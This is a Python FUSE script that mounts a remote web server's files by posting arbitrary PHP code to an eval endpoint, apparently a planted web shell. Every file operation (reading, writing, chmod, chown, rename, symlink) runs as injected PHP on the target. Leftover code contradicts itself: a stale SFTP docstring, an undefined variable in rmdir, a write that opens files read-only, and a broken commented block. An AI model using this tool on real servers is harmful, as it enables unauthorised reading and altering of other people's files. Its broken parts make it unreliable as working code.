#!/usr/bin/env python
from __future__ import print_function, absolute_import, division

import logging

from sys import argv, exit
from time import time

# from fuse import FUSE, Operations, LoggingMixIn
from fuse import FUSE, Operations, LoggingMixIn

import requests
import string
import random


host = "127.0.0.1"
port = 80
path = "index.php"
url = "http://%s:%d/%s" % (host, port, path)
param = "c"

def random_string(charset, length):
    return "".join([random.choice(charset) for i in range(length)])

def eval_php_code(code):
    token = random_string(string.letters, 0x10)
    code = "error_reporting(0);echo '%s';%s;echo '%s';die();" % (token, code, token)
    data = {
        param:code,
    }
    response = requests.post(url, data=data)
    result = response.text.split(token)
    if len(result) == 3:
        return result[1]
    return ""

class WebFS(LoggingMixIn, Operations):
    '''
    A simple SFTP filesystem. Requires paramiko: http://www.lag.net/paramiko/
    You need to be able to login to remote host without entering a password.
    '''

    def __init__(self, *args, **kw):
        #FUSE.__init__(self, *args, **kw)
        #self.root = '/var/www/html'
        pass

    def chmod(self, path, mode):
        code = " \
        echo chmod(base64_decode('%s'), %d); \
        " % (path.encode("base64").rstrip("\n"), mode)
        return eval_php_code(code) == "1"

    def readdir(self, path, fh):
        token = random_string(string.letters, 0x10)
        code = " \
        echo join(scandir(base64_decode('%s')), '%s'); \
        " % (path.encode("base64").rstrip("\n"), token)
        return list(eval_php_code(code).split(token))

    def getattr(self, path, fh=None):
        token = random_string(string.letters, 0x10)
        code = " \
        echo join(stat(base64_decode('%s')), '%s'); \
        " % (path.encode("base64").rstrip("\n"), token)
        result = eval_php_code(code).split(token)
        if len(result) == 1:
            return {}
        data = {
            'st_atime':int(result[8]),
            'st_mtime':int(result[9]),
            'st_gid':int(result[5]),
            'st_uid':int(result[4]),
            'st_mode':int(result[2]),
            'st_size':int(result[7]),
        }
        return data


    def read(self, path, size, offset, fh):
        code = " \
        $file = fopen(base64_decode('%s'), 'rb'); \
        fseek($file, %d); \
        $data = fread($file, %d); \
        echo $data; \
        fclose($file); \
        " % (path.encode("base64").rstrip("\n"), offset, size)
        return eval_php_code(code)

    def write(self, path, data, offset, fh):
        code = " \
        $file = fopen(base64_decode('%s'), 'rb'); \
        fseek($file, %d); \
        $data = fwrite($file, base64_decode('%s')); \
        echo $data; \
        fclose($file); \
        " % (
            path.encode("base64").rstrip("\n"),
            offset,
            data.encode("base64").rstrip("\n"),
        )
        return eval_php_code(code)

    def readlink(self, path):
        code = " \
        echo readlink(base64_decode('%s')); \
        " % (path.encode("base64").rstrip("\n"))
        return eval_php_code(code)

    def mkdir(self, path, mode):
        code = " \
        echo mkdir(base64_decode('%s'), %d); \
        " % (path.encode("base64").rstrip("\n"), mode)
        return eval_php_code(code) == "1"

    def rmdir(self, path):
        code = " \
        echo rmdir(base64_decode('%s'), %d); \
        " % (path.encode("base64").rstrip("\n"), mode)
        return eval_php_code(code) == "1"

    def chown(self, path, uid, gid):
        code = " \
        echo chown(base64_decode('%s'), %d) && chgrp(base64_decode('%s'), %d); \
        " % (
            path.encode("base64").rstrip("\n"), uid,
            path.encode("base64").rstrip("\n"), gid,
        )
        return eval_php_code(code) == "1"

    def create(self, path, mode):
        code = " \
        $file = fopen(base64_decode('%s'), 'w'); \
        echo fclose($file); \
        " % (
            path.encode("base64").rstrip("\n"), mode,
        )
        return eval_php_code(code) == "1" and self.chmod(path, mode)

    def rename(self, old, new):
        code = " \
        echo rename(base64_decode('%s'), base64_decode('%s')); \
        " % (
            old.encode("base64").rstrip("\n"),
            new.encode("base64").rstrip("\n"),
        )
        return eval_php_code(code) == "1"

    def destroy(self, path):
        return True

    def symlink(self, target, source):
        code = " \
        echo symlink(base64_decode('%s'), base64_decode('%s')); \
        " % (
            target.encode("base64").rstrip("\n"),
            source.encode("base64").rstrip("\n"),
        )
        return eval_php_code(code) == "1"


'''

def truncate(self, path, length, fh=None):
return self.sftp.truncate(path, length)

    def unlink(self, path):
    return self.sftp.unlink(path)

def utimens(self, path, times=None):
return self.sftp.utime(path, times)

'''


if __name__ == '__main__':
    if len(argv) != 3:
        print('usage: %s <host> <mountpoint>' % argv[0])
        exit(1)

    logging.basicConfig(level=logging.DEBUG)

    fuse = FUSE(WebFS(argv[1]), argv[2], foreground=True, nothreads=True)
